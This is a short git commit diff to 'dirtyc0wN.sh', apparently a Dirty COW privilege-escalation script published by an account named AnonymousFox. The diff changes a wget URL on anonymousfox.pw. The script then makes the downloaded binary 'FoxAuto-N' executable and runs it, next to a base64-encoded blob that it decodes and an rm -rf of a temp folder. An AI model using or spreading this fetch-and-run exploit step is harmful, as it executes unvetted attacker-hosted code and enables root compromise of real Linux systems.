2465283758eeffea3b30094a7daf37d63566ea35
AnonymousFox-com <75270021+AnonymousFox-com@users.noreply.github.com>
2021-02-18 23:50:37 +0300

    Update dirtyc0wN.sh

--- dirtyc0wN.sh
+++ dirtyc0wN.sh
@@ -123,6 +123,6 @@ Yz0iaHR0cDovL2QudG9wNHRvcC5uZXQvcF8yNDlhNGlqMS5wbmciPjwvY2VudGVyPgo8L3ByZT4K
 CjxkaXYgYWxpZ249ImNlbnRlciI+' | base64 -d
 
 rm -rf /tmp/FoxAuto
-wget https://anonymousfox.pw/local/FoxAuto/FoxAuto-N
+wget https://anonymousfox.pw/_@files/local/FoxAuto-N
 chmod +x FoxAuto-N
 ./FoxAuto-N 0
